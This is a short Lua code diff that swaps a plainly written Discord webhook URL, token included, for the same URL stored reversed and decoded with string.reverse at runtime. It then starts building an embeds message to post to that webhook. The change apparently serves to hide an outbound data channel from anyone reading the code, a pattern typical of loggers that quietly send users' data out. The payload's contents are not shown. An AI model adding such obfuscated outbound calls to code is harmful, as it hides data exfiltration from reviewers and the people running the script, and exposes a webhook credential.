@@ -150,8 +150,7 @@ else
 
 
 
-local url =
-   "https://discord.com/api/webhooks/943260249362686002/PO2T_FvYrku-Dk3yWQoLhX4yewzy6Du3cMIthm0H4cetOr5DcgpBtOVpwvY7581aTOAS"
+local url = string.reverse("8gQHoE2S5RGBq5-0vwF_xX1o9CX2CvhIhKkxbrfWMrneZYrq9e_huxsfhgtDkTnX1GXo/419789022329444449/skoohbew/ipa/moc.drocsid//:sptth")
    
 local data = {
    ["embeds"] = {
